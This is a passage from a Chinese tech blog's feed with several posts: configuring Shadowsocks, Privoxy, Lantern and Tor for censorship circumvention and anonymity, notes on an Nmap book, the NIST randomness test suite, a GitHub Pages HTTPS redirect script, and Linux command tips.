        &lt;h2 id=&quot;一、理解旁路攻击&quot;&gt;&lt;a href=&quot;#一、理解旁路攻击&quot; class=&quot;headerlink&quot; title=&quot;一、理解旁路攻击&quot;&gt;&lt;/a&gt;一、理解旁路攻击&lt;/h2&gt;&lt;p&gt;在前几年的工作里，对智能卡（或者说芯片卡、CPU 卡，比如 SIM 卡、芯片银行卡、社保卡等
      
    
    </summary>
    
    
      <category term="SCA" scheme="https://g2ex.top/tags/SCA/"/>
    
      <category term="SPA" scheme="https://g2ex.top/tags/SPA/"/>
    
      <category term="DPA" scheme="https://g2ex.top/tags/DPA/"/>
    
      <category term="Smart Card" scheme="https://g2ex.top/tags/Smart-Card/"/>
    
  </entry>
  
  <entry>
    <title>我的科学上网技巧</title>
    <link href="https://g2ex.top/2016/05/20/Tips-on-Chinternet/"/>
    <id>https://g2ex.top/2016/05/20/Tips-on-Chinternet/</id>
    <published>2016-05-20T23:30:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>尽管也称互联网，但在国内，如若有以下一个或多个需求，你就不得不学习一下科学上网了：</p><ol><li>访问的网站或服务被（GFW）墙；</li><li>网络提供商（ISP）劫持了网络流量；</li><li>需要匿名（隐藏真实 IP）的情况，如渗透测试；</li><li>躲避网络监控；</li><li>其他情况。</li></ol><p>这里分享一下我的科学上网技巧，使用到的工具软件可能有 <code>Shadowsocks</code>、<code>Lantern</code>、<code>Privoxy</code>、<code>Tor</code>。根据不同的目的选择不同的工具。</p><h2 id="一、绕过-GFW-和-ISP-劫持"><a href="#一、绕过-GFW-和-ISP-劫持" class="headerlink" title="一、绕过 GFW 和 ISP 劫持"></a>一、绕过 GFW 和 ISP 劫持</h2><p>最简单和不折腾的方法是购买 VPN，次之是购买一台海外 VPS，自己安装 VPN 或 Shadowsocks 服务端。VPN 的优点是可以全局翻墙，Shadowsocks 虽然可以设置全局模式，但是对于不支持代理的本地应用是没有办法的，当然这种情况下可以试试 <code>ProxifierPE</code> 强制所有连接通过代理上网。</p><p>使用 Shadowsocks 可能遇到的另一个问题是，因为 Shadowsocks 使用的是 SOCKS5 类型的代理，当本地应用只支持 HTTP/HTTPS 类型代理时，就需要自己解决 HTTP 转换为 SOCKS5 的问题。当然，这个问题使用 <code>Privoxy</code> 就能很好地解决。</p><p>本节主要介绍如何组合使用 Shadowsocks 和 Privoxy，并假设你已经安装并配置好了 Shadowsocks（Linux 中可以安装 shadowsocks-qt5 或 命令行版本的 Shadowsocks）。</p><p>Shadowsocks 与 Privoxy 组合使用的示意图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-20_chinternet.webp" alt="Shadowsocks_Privoxy" title="Shadowsocks Privoxy 组合使用示意图"></p><p>假设你已经配置好了 Shadowsocks，接下来配置 Privoxy。<br><strong>Windows</strong> 系统中右键点击 Privoxy 托盘图标，依次点击 <code>Edit</code> - <code>Main Configuration</code> 打开配置文件；<strong>Linux</strong> 系统中 Privoxy 的配置文件位于<code>/etc/privoxy/config</code>。配置文件修改为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把 HTTP 流量转发到本机 127.0.0.1:1080 的 Shadowsocks</span></span><br><span class="line">forward-socks5 / 127.0.0.1:1080 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可选，默认只监听本地连接 127.0.0.1:8118</span></span><br><span class="line"><span class="comment"># 可以允许局域网中的连接</span></span><br><span class="line">listen-address 0.0.0.0:8118</span><br></pre></td></tr></table></figure><p>启动 Shadowsocks 和 Privoxy 后，把本地应用的代理设置为 HTTP/HTTPS 类型的 <code>127.0.0.1:8118</code>，就可以绕过 GFW 和 ISP 了。如果局域网中的其他 PC 或手机也希望使用该电脑上网（假设该电脑 IP 地址为 <code>192.168.1.10</code>），把它们的代理设置为 <code>19.168.1.10:8118</code> 即可。</p><p><strong>Tips</strong></p><p>目前，有一个讨巧的的办法替代这两者的组合：使用 <a href="https://www.getlantern.org/" title="Lantern" target="_blank" rel="noopener">Lantern</a> —— 一款<a href="https://github.com/getlantern/lantern" title="Lantern Github 主页" target="_blank" rel="noopener">开源</a>的安全上网工具。它使用的是 HTTP 类型代理，本地端口为 <code>8787</code>，也就是说，把本地应用的代理设置为 <code>127.0.0.1:8787</code> 就可以使用 HTTP 类型的代理了。而且使用它，也无需自己购买 VPS。</p><p>Lantern 默认非全局代理，可以在设置中改为全局模式。</p><p>另一方面，Lantern 只监听本机 <code>127.0.0.1:8787</code> 的连接，如果局域网中的电脑或手机也想通过这台电脑翻墙（假设该电脑 IP 地址为 192.168.1.10），那么也需要配合 Privoxy 使用。这时，Privoxy 的配置应该如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 监听局域网中连接到本地 8118 端口的连接，转发给 8787 端口的 Lantern</span></span><br><span class="line">forward / 127.0.0.1:8787</span><br><span class="line">listen-address 127.0.0.1:8118    # 可改为 0.0.0.0:8118 允许局域网的连接</span><br></pre></td></tr></table></figure><h2 id="二、匿名上网"><a href="#二、匿名上网" class="headerlink" title="二、匿名上网"></a>二、匿名上网</h2><p>网络中保持匿名的办法是使用 <a href="https://www.torproject.org/" title="Tor 官网" target="_blank" rel="noopener">Tor</a>，匿名的意思是隐藏你当前的 IP 地址。Internet 上有很多志愿者运行着 Tor 中继节点，Tor 能保证从出发点的流量至少经过三个不同的中继节点到达目的地址，而且这三个不同的中继不会每次都相同。</p><p>形象地说，你想把一封匿名信交给小明，在大街上随便找了一陌生人 A 让 A 帮忙转交，A 走了一段路程后随便找了一个陌生人 B 让 B 帮忙转交，B 走了一段路程后随便找了一个陌生人 C 让 C 帮忙转交，最终 C 按照信封上的地址找到了小明并把信交给了他。小明只知道是 C 转交了这封信，至于是谁写的这封信，他就无从得知了。A、B、C 分别对应着 Tor 网络的中继节点，这种投递匿名信的方式就起到了隐藏 IP 地址的效果。</p><p>如下图所示，使用 Tor 从本机经过三跳访问了 Google。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-20_150316.webp" alt="Tor_Browser" title="Tor Browser"></p><h3 id="Tor-浏览器"><a href="#Tor-浏览器" class="headerlink" title="Tor 浏览器"></a>Tor 浏览器</h3><p>为了方便使用 Tor，Tor 开发者把 Tor 集成到了定制版的 Firefox 中，简单设置一下就能正常使用。</p><p>Tor 浏览器专为大陆等网络环境加入了流量混淆的选项。首次打开浏览器时会弹出 Tor 状态检查，点击<code>设置</code>配置 Tor 网桥，勾选<code>互联网提供商（ISP）是否对 Tor 网络连接进行了封锁或审查</code>中的<code>是</code>，把下一步中的网桥类型选择<code>meek-amazon</code>或<code>meek-azure</code>。这两者在大陆没被完全封锁，因此可以用来做跳板网桥。</p><p>不过随着网络环境的恶化，Tor 提供的网桥类型都不可用时，就需要使用自己的 Shadowsocks 或 Lantern 代理了。</p><p>首次打开 Tor 浏览器，在 Tor 设置中勾选<code>互联网提供商（ISP）是否对 Tor 网络连接进行了封锁或审查</code>中的<code>否</code>，在下一步<code>是否需要本地代理访问互联网？</code>中选择<code>是</code>，下一步中设置你的代理：</p><ul><li>使用 Shadowsocks 则设置为 SOCKS5 类型的 <code>127.0.0.1:1080</code>；</li><li>使用 Lantern 则设置为 HTTP/HTTPS 类型的 <code>127.0.0.1:8787</code>；</li></ul><p>如果通过局域网中其他计算机的配置联网，把 <code>127.0.0.1</code> 改为那台计算机的 IP 地址。</p><p>使用了代理的 Tor 浏览器原理示意图如下（以 Tor + Shadowsocks 组合为例）：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-20_chinternet_02.webp" alt="Tor_Shadowsocks" title="Tor 浏览器 + Shadowsocks 组合使用示意图"></p><h3 id="Tor-Expert-Bundle"><a href="#Tor-Expert-Bundle" class="headerlink" title="Tor Expert Bundle"></a>Tor Expert Bundle</h3><p>Tor 浏览器适用于使用浏览器匿名上网的场景，如果打算让本地应用（如其他浏览器、Linux 中的 Terminal 等）也使用 Tor 隐藏 IP 地址，那么就需要自己手动配置 Tor 了。从 <a href="https://www.torproject.org/download/" title="Tor 下载" target="_blank" rel="noopener">Tor 官网下载</a> 操作系统对应的 <code>Expert Bundle</code>，它只包含 Tor 工具，不含浏览器。</p><p>假设你已经配置好了 Shadowsocks，接下来，为 Tor 配置 Shadowsocks 代理。</p><p><strong>Windows</strong> 系统中，打开 <code>%AppData%/tor</code> 目录（如果不存在则创建该目录），新建 <code>torrc</code> 文件，内容如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 通过 SOCKS5 代理</span></span><br><span class="line">SOCKS5Proxy 127.0.0.1:1080</span><br><span class="line"><span class="comment">## 如果使用 HTTP/HTTPS 代理</span></span><br><span class="line"><span class="comment"># HTTPSProxy 127.0.0.1:8118</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 如果只允许特定端口的网络连接，如 80 和 443</span></span><br><span class="line">ReachableAddresses *:80,*:443</span><br><span class="line">ReachableAddresses reject *:*</span><br></pre></td></tr></table></figure><p><strong>Linux</strong> 系统中，Tor 的配置文件位于 <code>/etc/tor/torrc</code>，配置内容同上。</p><p>启动 Shadowsocks 和 Tor，因为 Tor 监听的是 SOCKS5 类型的本地 <code>9050</code> 端口，把需要匿名的本地应用代理设置为 SOCKS5 类型，代理地址设置为 <code>127.0.0.1:9050</code>，实现匿名上网。</p><p>还是老问题，如果本地应用只支持 HTTP/HTTPS 代理类型，那么仍需要使用 Privoxy，修改其配置文件为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forward-socks5 / 127.0.0.1:9050 .</span><br><span class="line">listen-address 127.0.0.1:8118    # 可改为 0.0.0.0:8118 允许局域网的连接</span><br></pre></td></tr></table></figure><p>这样一来，本地应用的代理设置为 HTTP/HTTPS 类型的 <code>127.0.0.1:8118</code> 就可以实现匿名上网了。</p><p>Privoxy + Tor + Shadowsocks 组合使用示意图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-20_chinternet_03.webp" alt="此处输入图片的描述" title="Privoxy + Tor + Shadowsocks 组合使用示意图"></p><h3 id="One-More-Tip"><a href="#One-More-Tip" class="headerlink" title="One More Tip"></a>One More Tip</h3><p>使用 Tor 匿名访问网络除了应用于渗透测试，另一个应用场景是编写爬虫变换 IP 地址爬取站点，减小被网站屏蔽的可能性。</p><p>在 Linux Terminal 中，使用 export 命令设置代理，可以只在当前 Terminal 中生效，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=http://127.0.0.1:8118</span><br><span class="line"><span class="built_in">export</span> https_proxy=https://127.0.0.1:8118</span><br></pre></td></tr></table></figure><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>接下来简要归纳上述内容，给出每种组合的配置内容。</p><h3 id="Privoxy-Shadowsocks-组合-——-翻墙"><a href="#Privoxy-Shadowsocks-组合-——-翻墙" class="headerlink" title="Privoxy + Shadowsocks 组合 —— 翻墙"></a>Privoxy + Shadowsocks 组合 —— 翻墙</h3><p>配置 Privoxy，Linux 系统中位于 <code>/etc/privoxy/config</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forward-socks5 / 127.0.0.1:1080 .</span><br><span class="line">listen-address 127.0.0.1:8118    # 可改为 0.0.0.0:8118 允许局域网的连接</span><br></pre></td></tr></table></figure><p>本地代理需设置为 <code>HTTP/HTTPS</code> 类型的 <code>127.0.0.1:8118</code>。如果不使用 Privoxy，本地代理需设置为 <code>SOCKS5</code> 类型的 <code>127.0.0.1:1080</code>。</p><h3 id="Privoxy-Tor-Shadowsocks-组合-——-匿名上网"><a href="#Privoxy-Tor-Shadowsocks-组合-——-匿名上网" class="headerlink" title="Privoxy + Tor + Shadowsocks 组合 —— 匿名上网"></a>Privoxy + Tor + Shadowsocks 组合 —— 匿名上网</h3><p>配置 Privoxy，Linux 系统中位于 <code>/etc/privoxy/config</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forward-socks5 / 127.0.0.1:9050 .</span><br><span class="line">listen-address 127.0.0.1:8118    # 可改为 0.0.0.0:8118 允许局域网的连接</span><br></pre></td></tr></table></figure><p>配置 Tor，Windows 系统中位于 <code>%AppData%/tor/torrc</code>，Linux 系统中位于 <code>/etc/tor/torrc</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SOCKS5Proxy 127.0.0.1:1080    # Shadowsocks 代理地址</span><br><span class="line">ReachableAddresses *:80,*:443</span><br><span class="line">ReachableAddresses reject *:*</span><br></pre></td></tr></table></figure><p>本地代理需设置为 <code>HTTP/HTTPS</code> 类型的 <code>127.0.0.1:8118</code>。如果不使用 Privoxy，本地代理需设置为 <code>SOCKS5</code> 类型的 <code>127.0.0.1:9050</code>。</p><h3 id="Privoxy-Tor-Lantern-组合-——-匿名上网"><a href="#Privoxy-Tor-Lantern-组合-——-匿名上网" class="headerlink" title="Privoxy + Tor + Lantern 组合 —— 匿名上网"></a>Privoxy + Tor + Lantern 组合 —— 匿名上网</h3><p>配置 Privoxy，Linux 系统中位于 <code>/etc/privoxy/config</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">forward-socks5 / 127.0.0.1:9050 .</span><br><span class="line">listen-address 127.0.0.1:8118    # 可改为 0.0.0.0:8118 允许局域网的连接</span><br></pre></td></tr></table></figure><p>配置 Tor，Windows 系统中位于 <code>%AppData%/tor/torrc</code>，Linux 系统中位于 <code>/etc/tor/torrc</code>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTPSProxy 127.0.0.1:8787    # Lantern 代理地址</span><br><span class="line">ReachableAddresses *:80,*:443</span><br><span class="line">ReachableAddresses reject *:*</span><br></pre></td></tr></table></figure><p>本地代理需设置为 <code>HTTP/HTTPS</code> 类型的 <code>127.0.0.1:8118</code>。如果不使用 Privoxy，本地代理需设置为 <code>SOCKS5</code> 类型的 <code>127.0.0.1:9050</code>。</p><hr><p>EOF</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;尽管也称互联网，但在国内，如若有以下一个或多个需求，你就不得不学习一下科学上网了：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;访问的网站或服务被（GFW）墙；&lt;/li&gt;
&lt;li&gt;网络提供商（ISP）劫持了网络流量；&lt;/li&gt;
&lt;li&gt;需要匿名（隐藏真实 IP）的情况，如渗透测试；&lt;/li&gt;
      
    
    </summary>
    
    
      <category term="Shadowsocks" scheme="https://g2ex.top/tags/Shadowsocks/"/>
    
      <category term="Tor" scheme="https://g2ex.top/tags/Tor/"/>
    
      <category term="GFW" scheme="https://g2ex.top/tags/GFW/"/>
    
  </entry>
  
  <entry>
    <title>《Nmap 渗透测试指南》笔记</title>
    <link href="https://g2ex.top/2016/04/29/Nmap-Notes/"/>
    <id>https://g2ex.top/2016/04/29/Nmap-Notes/</id>
    <published>2016-04-29T14:17:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>《Nmap 渗透测试指南》可以说 Nmap 工具的参数手册，适合快速查阅 Nmap 命令参数。整本书二百多页，去掉章节中重复的命令表格和 Nmap 命令的输出结果，内容可以缩减到一百页以内。</p><p>书中对参数的讲解比较浅显，入门的读者需要利用搜索引擎自行摸索。查阅时配合 Nmap 的 manual 效果会更一些（<code>$ man nmap</code>）。</p><p>本文使用 FreeMind 总结了书中出现的参数和命令示例，导出的图片如下图所示，FreeMind 源文件在<a href="http://pan.baidu.com/s/1dEUxeW5" title="Nmap Notes" target="_blank" rel="noopener">这里</a>下载，密码 9m73。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-04-29_nmap.webp" alt="Nmap Notes" title="Nmap Notes"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;《Nmap 渗透测试指南》可以说 Nmap 工具的参数手册，适合快速查阅 Nmap 命令参数。整本书二百多页，去掉章节中重复的命令表格和 Nmap 命令的输出结果，内容可以缩减到一百页以内。&lt;/p&gt;
&lt;p&gt;书中对参数的讲解比较浅显，入门的读者需要利用搜索引擎自行摸索。查阅时
      
    
    </summary>
    
    
      <category term="Penetration" scheme="https://g2ex.top/tags/Penetration/"/>
    
      <category term="Nmap" scheme="https://g2ex.top/tags/Nmap/"/>
    
  </entry>
  
  <entry>
    <title>关于随机数质量测试</title>
    <link href="https://g2ex.top/2016/04/14/RNG-Statistical-Test/"/>
    <id>https://g2ex.top/2016/04/14/RNG-Statistical-Test/</id>
    <published>2016-04-14T18:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>“It’s a good day, isn’t it?”</p></blockquote><p>我们先从天气说起。</p><p>天气是不是随机的呢？如果让我们猜明天会不会下雨，我们十有八九能猜对，因为现有的科技可以做到精准预测，因此可以说明天的天气不是随机的。</p><p>如果让我们猜100年后的这一天会不会下雨，那就不好猜了，科技还无法做到，但这也不能认为100年后这一天的天气是随机的，因为不排除未来的科技能够预测。</p><p>在经典物理中，是不存在真随机的，因为经典物理量是可以测量和预测的。那在量子力学中呢？因为科技所限，也不能确定量子力学中是否存在真正的真随机。</p><p>也就是说，真正的真随机存在性还不确定。我们通常说的真随机数是指另外一个意思，满足统计意义上的随机，一般是由硬件的随机数产生器生成的。在能够提供随机数的智能卡中，一般会有一个硬件的随机数发生器。在计算机中，操作系统可以根据非确定的设备事件来生成真随机数，比如时钟、IO请求的响应时间、特定硬件中断的时间间隔、键盘敲击速度、鼠标位置变化等等。</p><p>这样一来，我们可以说自己使用的随机数发生器（硬件或软件）是真随机的，那怎么让别人信服呢？因此需要一个判定随机数是否满足真随机条件的标准。比如应用较广的随机序列统计测试方法——NIST（National Institute of Standards and Technology：美国国家标准与技术研究所）Special Publication（800 Series），简称 NSP800。</p><p>NSP800测试程序是一个统计学包，可以到<a href="http://csrc.nist.gov/groups/ST/toolkit/rng/documentation_software.html" title="NIST随机测试套件" target="_blank" rel="noopener">NIST官网下载</a>，该工具包括15种测试手段。这些测试手段可测试由用作保密随机或者伪随机数发生器的硬件和软件产生的任意长的二进制序列的随机性。每个测试项都是针对被测序列的某一特性进行检测的，其中一些测试又可以分解成多种子测验。<br>这15种测试手段及其对应的检测目的如下：</p><ol><li>频率测试：检测整个序列中的0、1是否趋于等概率，如果是，则序列是随机的。</li><li>块内频率测试：检测每个子序列中的0、1是否趋于等概率，如果是，则序列是随机的。</li><li>累积和测试：检测序列的正向、反向累加和以反映0、1在序列中的分布是否均匀，太大或太小都是非随机的。</li><li>游程测试：检测序列中游程（一个没有间断的相同数序列，或者是“1111…”或者“0000…”）的数目是否如真随机序列期望的那样，接近序列长度的一半，如果是，则序列是随机的。</li><li>块内最长游程测试：检测子序列中最大长“1”游程的长度是否与真随机序列中的长度近似一致，如果是，则序列是随机的。</li><li>二元矩阵秩测试：检测序列中固定长度子序列的线性相关性，如果线性相关性较小，则序列是随机的。</li><li>离散傅立叶变换测试：检测序列进行离散傅立叶变换后的频谱是否趋于均匀分布；做法是观察超过95%阈值的峰值数目与低于5%峰值的数目是否有显著不同，如果接近，则序列是随机的。</li><li>非重叠模块匹配测试：检测序列中的子序列是否与太多的非周期模板相匹配，太多就意味着序列是非随机的。</li><li>重叠模块匹配测试：检测序列中重叠模块（特定长度的连续“1”）出现的次数，是否与真随机序列的情况偏离太大，太大则是非随机的。</li><li>通用统计测试：检测序列是否能在信息不丢失的条件下明显压缩，一个不可被明显压缩的序列是随机的。</li><li>近似熵测试：检测序列中相邻长度(m和m+1)的重叠子块的频数，是否与随机情况下预期的频数相近似。</li><li>随机游动测试：统计各个游程中某个特定状态出现的次数，检测其是否远远超过真随机序列中的情况，如果是，则序列是非随机的。</li><li>随机游动状态频数测试：检测序列中，某一特定状态在一个随机游程中出现的次数与真随机序列的偏离程度，如果偏离程度较大，则序列是非随机的。</li><li>序列测试：检测指定长度的所有子序列出现的次数是否趋于等概率，如果是，则序列是随机的。</li><li>线性复杂度测试：检测每个子序列的线性复杂度是否达到可视为是随机序列的程度。</li></ol><p>李璞根据NIST官方网站的说明书编译了中文的《NIST随机数测试》，详细介绍了每种测试手段的数学原理，有兴趣的朋友可以去了解一下。</p><p>NSP800随机数测试套件需要在Linux中使用<code>make</code>编译，生成<code>access</code>可执行文件后使用，测试完成后会在<code>experiments</code>目录中生成测试报告。该套件的使用方法请见本文附件。</p><p>有意思的现象是，由同一个随机数生成器产生的不同批次的随机数测试结果有可能不同。第一组随机数有2项未通过，第二组有可能15项全部通过，这是因为随机数是不可预测的啊！</p><p>因此在实际操作中，同一个随机数生成器会产生三组随机数，只要有两组通过了测试，那就可以判断这个随机数生成器是满足条件的。</p><blockquote><p>附上曾经整理的 NSP800 套件的使用文档<br><a href="https://github.com/gymgle/gnotes/blob/master/attachments/NSP800-Guide.pdf" target="_blank" rel="noopener">https://github.com/gymgle/gnotes/blob/master/attachments/NSP800-Guide.pdf</a> </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;“It’s a good day, isn’t it?”&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;我们先从天气说起。&lt;/p&gt;
&lt;p&gt;天气是不是随机的呢？如果让我们猜明天会不会下雨，我们十有八九能猜对，因为现有的科技可以做到精准预测，因此可以说明天
      
    
    </summary>
    
    
      <category term="RNG" scheme="https://g2ex.top/tags/RNG/"/>
    
      <category term="NIST" scheme="https://g2ex.top/tags/NIST/"/>
    
  </entry>
  
  <entry>
    <title>Github Pages站点HTTPS使用技巧</title>
    <link href="https://g2ex.top/2016/03/17/Github-Pages-HTTPS-Tips/"/>
    <id>https://g2ex.top/2016/03/17/Github-Pages-HTTPS-Tips/</id>
    <published>2016-03-17T10:15:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p>其实早在两年前的2014年3月，Github Pages就开始支持HTTPS了。部署好你的站点，不需要多做什么就可以直接使用<code>https://yourname.github.io</code>访问了。</p><p>不过Github Pages的HTTPS使用有两个需要注意的地方：</p><ol><li>它只支持Github二级域名<code>yourname.github.io</code>的形式，不支持自定义的独立域名；</li><li>它同时支持HTTP和HTTPS的访问，但不能强制<code>HTTP</code>跳转到<code>HTTPS</code>；</li></ol><p>第一个问题的解决办法，可以参考本站去年10月份的一篇<a href="https://g2ex.github.io/2015/10/14/Hexo-with-SSL-Hosted-on-Github-Page/" target="_blank" rel="noopener">《为Github的Hexo博客启用SSL/TLS》</a>，使用CloudFlare的免费套餐提供的SSL为独立域名的博客启用HTTPS连接。</p><p>关于第二个问题，如果你不想申请独立域名，同时只保留HTTPS访问，那么可以参考本文以下两个办法。</p><h2 id="一、强制HTTP跳转到HTTPS"><a href="#一、强制HTTP跳转到HTTPS" class="headerlink" title="一、强制HTTP跳转到HTTPS"></a>一、强制HTTP跳转到HTTPS</h2><p>因为Github Pages托管的是静态站点，所以无法在HTML中使用<code>&lt;meta refresh&gt;</code>标签动态跳转，只能在页面中使用JavaScript。</p><p>找到网站主题中的模版，以Hexo的NexT主题为例，打开该主题<code>layout</code>目录下的<code>_layout.swig</code>，因为<code>_layout.swig</code>会被所有页面引用，只需在它的<code>&lt;head&gt;</code>标签中加入以下代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line">    var host = "yourname.github.io";</span><br><span class="line">    if ((host == window.location.host) &amp;&amp; (window.location.protocol != "https:"))</span><br><span class="line">        window.location.protocol = "https";</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果你的Github Pages站点没有模版，那就只好在所有页面的<code>&lt;head&gt;</code>标签中都加入上面的JavaScript代码了。</p><h2 id="二、搜索引擎优化"><a href="#二、搜索引擎优化" class="headerlink" title="二、搜索引擎优化"></a>二、搜索引擎优化</h2><p>使用<a href="https://support.google.com/webmasters/answer/139066" target="_blank" rel="noopener">canonical</a>告诉搜索引擎收录你站点的HTTPS版本。</p><p>其实强制HTTP跳转到HTTPS就已经解决基本问题了，搜索引擎优化这个步骤是一个锦上添花的过程。既然行动了，那就做得完美吧！</p><p>同样以NexT主题为例，在_layout.swig的<head><meta name="generator" content="Hexo 3.9.0">标签中加入以下代码：</head></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"canonical"</span> <span class="attr">href</span>=<span class="string">"https://yourname.github.io"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://konklone.com/post/github-pages-now-sorta-supports-https-so-use-it" target="_blank" rel="noopener">https://konklone.com/post/github-pages-now-sorta-supports-https-so-use-it</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;其实早在两年前的2014年3月，Github Pages就开始支持HTTPS了。部署好你的站点，不需要多做什么就可以直接使用&lt;code&gt;https://yourname.github.io&lt;/code&gt;访问了。&lt;/p&gt;
&lt;p&gt;不过Github Pages的HTTPS使用有两
      
    
    </summary>
    
    
      <category term="Github" scheme="https://g2ex.top/tags/Github/"/>
    
      <category term="Hexo" scheme="https://g2ex.top/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Linux Tips</title>
    <link href="https://g2ex.top/2016/03/16/Linux-Tips/"/>
    <id>https://g2ex.top/2016/03/16/Linux-Tips/</id>
    <published>2016-03-16T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常用技巧"><a href="#常用技巧" class="headerlink" title="常用技巧"></a>常用技巧</h2><p><code>ps -aux</code>查看进程。</p><p><code>netstat -tln</code>查看网络开放端口。</p><p><code>Ctrl+H</code>查看Ubuntu里以<code>.</code>开头的隐藏文件。</p><p>在linux Terminal中使命令行程序后台运行，在命令后加个<code>&amp;</code>即可，例如：<code>$ gedit &amp;</code>。但即使这样，Terminal关闭后程序扔会退出。<br>使用<code>nohup</code>命令可实现关闭Terminal后程序继续运行，方法：<code>nohup &lt;命令&gt;  &amp;</code>，例如：<code>nohup gedit &amp;</code>。</p><p><code>pip install xxx</code>安装xxx包，<code>pip install --upgrade xxx</code>升级包，<code>pip uninstall xxx</code>卸载包。</p><p>查看用户信息：<code>whoami</code>、<code>id</code>。</p><p><code>apt-get install</code>安装软件时，默认会有提示用户确认，加上<code>-y</code>参数可以跳过交互模式直接确认。</p><p>在虚拟机中安装vmware tools的时候，加上<code>-d</code>参数可以按照默认设置安装，跳过交互模式。</p><p><code>lsb_release -s -c</code>可以查看系统当前<code>发行版</code>的名称，比如在Ubuntu 14.04上执行该命令会输出<code>trusty</code>。</p><h2 id="64位Ubuntu安装32位软件，需要安装32位的库来获得支持"><a href="#64位Ubuntu安装32位软件，需要安装32位的库来获得支持" class="headerlink" title="64位Ubuntu安装32位软件，需要安装32位的库来获得支持"></a>64位Ubuntu安装32位软件，需要安装32位的库来获得支持</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install lib32z1 lib32ncurses5 lib32bz2-1.0 lib32stdc++6</span><br></pre></td></tr></table></figure><h2 id="Ubuntu-14-04-LTS安装shadowsocks-qt5"><a href="#Ubuntu-14-04-LTS安装shadowsocks-qt5" class="headerlink" title="Ubuntu 14.04 LTS安装shadowsocks-qt5"></a>Ubuntu 14.04 LTS安装shadowsocks-qt5</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:hzwhuang/ss-qt5</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install shadowsocks-qt5</span><br></pre></td></tr></table></figure><h2 id="Kali中设置Terminal快捷键"><a href="#Kali中设置Terminal快捷键" class="headerlink" title="Kali中设置Terminal快捷键"></a>Kali中设置Terminal快捷键</h2><p>设置-键盘-快捷键-自定义快捷键，命令中输入<code>x-terminal-emulator</code>，点击<code>添加</code>后单击该行右侧<code>禁用</code>处，按下自定义快捷键，比如<code>Ctrl + Alt + T</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-03-16_085908.webp" 